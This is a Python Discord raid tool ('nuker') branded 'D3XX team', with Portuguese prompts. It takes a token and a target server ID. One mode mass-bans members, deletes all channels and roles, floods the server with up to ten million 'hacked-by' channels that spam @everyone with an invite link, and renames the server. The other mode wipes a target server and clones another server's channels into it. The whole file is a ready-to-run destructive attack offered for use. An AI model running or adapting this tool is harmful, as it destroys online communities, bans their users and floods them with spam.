
import os
import sys
import asyncio
import discord
import time
from colorama import Fore, Style, init

init(autoreset=True)


DELAY_SPAM = 0.04
DELAY_BAN = 0.01
SPAM_LIMIT = 10000000
CHANNEL_NAME = "hacked-by-𝐝𝟑𝐱𝐱-𝐭𝐞𝐚𝐦"
INVITE_LINK = "https://discord.gg/CBGedY2Gu"

def get_terminal_width():
    try: return os.get_terminal_size().columns
    except: return 80                                                  
def centralize_gradient(text, base_color):
    width = get_terminal_width()
    lines = text.strip('\n').split('\n')
    result = []
    for i, line in enumerate(lines):
        if i < 2: color = base_color
        elif i < 4: color = base_color + Style.BRIGHT
        else: color = Fore.WHITE
        result.append(color + line.center(width))
    return '\n'.join(result)

def draw_main_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    art = """
  _____ ____               _
 |  __ \___ \             | |
 | |  | |__) |_  ____  __ | |_ ___  __ _ _ __ ___
 | |  | |__ <\ \/ /\ \/ / | __/ _ \/ _` | '_ ` _ \
 | |__| |__) |>  <  >  <  | ||  __/ (_| | | | | | |
 |_____/____//_/\_\/_/\_\  \__\___|\__,_|_| |_| |_|

                                                                       
"""
    print("\n" + centralize_gradient(art, Fore.RED) + "\n")

def draw_cloner_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    art = """
 ▄████████  ▄█        ▄██████▄  ███▄▄▄▄    ▄█  ███▄▄▄▄      ▄██████▄
███    ███ ███       ███    ███ ███▀▀▀██▄ ███  ███▀▀▀██▄   ███    ███
███    █▀  ███       ███    ███ ███   ███ ███▌ ███   ███   ███    █▀
███        ███       ███    ███ ███   ███ ███▌ ███   ███  ▄███
███        ███       ███    ███ ███   ███ ███▌ ███   ███ ▀▀███ ████▄
███    █▄  ███       ███    ███ ███   ███ ███  ███   ███   ███    ███
███    ███ ███▌    ▄ ███    ███ ███   ███ ███  ███   ███   ███    ███
████████▀  █████▄▄██  ▀██████▀   ▀█   █▀  █▀    ▀█   █▀    ████████▀
           ▀
"""
    print("\n" + centralize_gradient(art, Fore.CYAN) + "\n")

def draw_kill_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    art = """
███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████
███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███
███   ███ ███    ███   ███▐██▀     ███    █▀
███   ███ ███    ███  ▄█████▀     ▄███▄▄▄
███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀
███   ███ ███    ███   ███▐██▄     ███    █▄
███   ███ ███    ███   ███ ▀███▄   ███    ███
 ▀█   █▀  ████████▀    ███   ▀█▀   ██████████
                       ▀
"""
    print("\n" + centralize_gradient(art, Fore.BLUE) + "\n")


draw_main_banner()
m = " " * 15
token = input(f"{m}{Fore.RED}[ + ] {Fore.WHITE}Token: {Fore.RED}").strip()
print(f"\n{m}{Fore.RED}[ 1 ] {Fore.WHITE}Clonar Servidor")
print(f"{m}{Fore.RED}[ 2 ] {Fore.WHITE}𝐝𝟑𝐱𝐱 (Wipe + Ban All + Spam Link)")
choice = input(f"\n{m}{Fore.RED}[ ? ] {Fore.WHITE}Escolha: {Fore.RED}").strip()

if choice == '1':
    id_origem = int(input(f"{m}{Fore.RED}[ + ] {Fore.WHITE}ID Origem: {Fore.RED}").strip())
    id_destino = int(input(f"{m}{Fore.RED}[ + ] {Fore.WHITE}ID Destino: {Fore.RED}").strip())
else:
    id_origem = 0
    id_destino = int(input(f"{m}{Fore.RED}[ + ] {Fore.WHITE}ID do Alvo: {Fore.RED}").strip())

class D3XX_Ultimate(discord.Client):
    async def log(self, tag, msg, color):
        t = time.strftime("%H:%M:%S")
        print(f"{Fore.BLACK}{Style.BRIGHT}[{t}] {color}[{tag}] {Fore.WHITE}{msg}")

    async def on_ready(self):
        if choice == '1': draw_cloner_banner()
        else: draw_kill_banner()
        target = self.get_guild(id_destino)
        if not target:
            await self.log("ERRO", "Servidor destino nao encontrado!", Fore.RED)
            return
        if choice == '2':
            await self.log("SYSTEM", f"Iniciando destruicao em: {target.name}", Fore.MAGENTA)
            for member in target.members:
                if member.id != self.user.id:
                    try:
                        await member.ban(reason="D3XX TEAM OWNED")
                        await self.log("BAN", f"Removido: {member.name}", Fore.RED)
                    except: await self.log("SKIP", f"Sem permissao: {member.name}", Fore.BLACK)
                    await asyncio.sleep(DELAY_BAN)
            for channel in target.channels:
                try: await channel.delete()
                except: pass
            for role in target.roles:
                if role.name != "@everyone":
                    try: await role.delete()
                    except: pass
            for i in range(SPAM_LIMIT):
                try:
                    new_ch = await target.create_text_channel(name=CHANNEL_NAME)
                    await self.log("SPAM", f"Canal #{i+1} criado", Fore.GREEN)
                    await new_ch.send(f"@everyone {INVITE_LINK}")
                    await asyncio.sleep(DELAY_SPAM)
                except: break
            try: await target.edit(name="𝐝𝟑𝐱𝐱 𝐭𝐞𝐚𝐦")
            except: pass
            os._exit(0)
        elif choice == '1':
            source = self.get_guild(id_origem)
            for ch in target.channels:
                try: await ch.delete()
                except: pass
            for category in source.categories:
                try:
                    new_cat = await target.create_category(name=category.name)
                    for channel in category.channels:
                        if isinstance(channel, discord.TextChannel): await new_cat.create_text_channel(name=channel.name)
                        elif isinstance(channel, discord.VoiceChannel): await new_cat.create_voice_channel(name=channel.name)
                        await self.log("CREATE", f"Canal: {channel.name}", Fore.GREEN)
                        await asyncio.sleep(0.8)
                except: pass
            os._exit(0)


try:
    intents = discord.Intents.all()
    client = D3XX_Ultimate(intents=intents)
except AttributeError:

    client = D3XX_Ultimate()

try:
    client.run(token, log_handler=None)
except Exception as e:
    print(f"{Fore.RED}Erro fatal ao iniciar: {e}")